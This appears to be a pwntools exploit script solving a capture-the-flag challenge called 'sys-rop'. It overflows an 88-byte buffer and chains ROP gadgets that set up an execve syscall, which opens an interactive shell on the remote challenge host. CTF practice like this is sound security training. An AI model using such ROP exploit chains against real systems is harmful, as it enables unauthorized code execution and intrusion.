#!/usr/bin/python3
from pwn import *
from pwn import remote


elf = context.binary = ELF("chall")
libc = elf.libc

local = False 
if local:
    p = process("./chall")
    #gdb.attach(p,'''b*0x401083\nc''')
else:
    p = remote('sys-rop.bsides.shellmates.club', 443,ssl=True)

elf = context.binary = ELF('./chall', checksec=False)

pop_rax = 0x0000000000401085
pop_rbp = 0x0000000000401073
pop_rdi = 0x000000000040107f
pop_rdx = 0x0000000000401083
pop_rsi = 0x0000000000401081
syscall = 0x000000000040100a

payload = payload = b'A' * 88
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(0x402010)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(syscall)

p.sendlineafter(b"Enter message: ",payload)

p.interactive()